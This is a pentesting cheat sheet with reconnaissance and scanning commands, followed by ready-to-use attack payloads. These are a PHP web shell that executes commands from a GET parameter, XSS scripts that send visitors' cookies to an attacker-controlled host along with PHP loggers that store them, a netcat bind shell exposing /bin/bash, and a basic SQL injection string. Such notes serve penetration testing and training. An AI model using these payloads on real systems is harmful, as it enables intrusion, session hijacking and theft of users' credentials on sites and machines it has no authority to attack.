# Pentesting Cheatsheet

## Information Gathering
Sub Domains Enumeration
• Google

◇ site:pwns.com


• Virustotal

◇ Search site and it will give you a list of sub domains.


• dnsdumpster.com

◇ Free version limited

◇ Search site and it will give you list of sub domains.


• crt.sh

◇ Search site and get cert data and sub domains.


• sublist3r

◇ Tool in kali to search for sub domains.

◇ Careful because Google may block you.


• amass

◇ Linux tool sub domain enum.

## Reconnaissance
https://www.exploit-db.com/google-hacking-database

## Footprinting and Scanning

Mapping a network
• ping sweep

◇ fping -a -g IPRANGE 2>/dev/null

◇ nmap -sn IPRANGE

◇ nmap -sn -iL hostslist.txt




OS Fingerprinting
◇ nmap -Pn -O <target(s)>



Port Scanning
◇ nmap

▪ -sT performs a TCP connect scan

▪ -sS performs a SYN scan (stealthy)

▪ -sV performs a version detection scan

▪ tcpwrapped means that the TCP handshake was completed, but the remote host closed the connection without receiving any data.

▪ Use masscan for large port scans.

### Dirbuster

### netcat
• nc -v google.com 80

◇ This will return the header sent and the response.


• via - tells use that there is a proxy between us and the site.

• openssl s_client -connect google.com :443

◇ This  is what is used instead of nc to interact with ssl sites.

◇ Add -debug for more info


• OPTIONS / HTTP/1.1
Host: google.com

◇ Prints options allowed by server.






## Vulnerability Assessment
### burpsuite
### nessus

## Exploitation
### PHP Shell
PHP shell to use with PUT

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<?php
if (isset($_GET['cmd']))
{
        $cmd = $_GET['cmd'];
        echo '<pre>';
        $result = shell_exec($cmd);
        echo $result;
        echo '</pre>';
}
?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can use it by passing your command via the cmd GET parameter.
victim.site/shell.php?cmd=ls
^ this will list all the files in the directory ^

### Cross Site Scripting
Test input field for xss.
<h1>test</h1>

Script to save cookies to attker site. Add to comments type section on site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<script>
var i = new Image();
i.src="http://attaker.site/log.php?q="+document.cookie;
</script>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


log.php to host on attacker.site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, ‘a’);
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



get.php to host on attack.site

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', ‘a’);

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). “ \n\n”);
fclose($fp);
?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Script to save cookies to attacker.site. Add to comments type section on site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### SQL Injection
Basic sql injection
‘ OR ’a'='a

Query becomes
SELECT Name, Description FROM Products WHERE ID=' ‘ OR ‘a’='a';

When we talk about web app, user inputs are:
GET parameters
POST parameters
HTTP Headers
	user-agent
	cookie
	accept

#### sqlmap


## Persistence
Start listening server on hacked host.
```
nc -lvp 1337 -e /bin/bash
```
Access the shell using netcat from attacker box.
```
nc -v hackedBoxIP 1337
```
Now run any command you want to execute on the hacked host.


## Exfiltration
Find exfil options: https://github.com/stufus/egresscheck-framework
Exfil data over DNS: https://github.com/TryCatchHCF/PacketWhisper

## Analysis and Review

## Reporting

## Tips and Tricks
### Windows
Search windows host.
```
dir /s /b stringToSearch
```

### Python
Simple HTTP Server
```
python -m SimpleHTTPServer 8080
```
This is useful to get tools to a host.

### Command Line Scripting
Output error to /dev/null
append 2>/dev/null to command.

### SQL
SELECT <columns list> FROM <table> WHERE <condition>;

<SELECT statement> UNION <other SELECT statement>;

Comments
SELECT field FROM table; # this is a comment
SELECT field FROM table; -- this is a comment
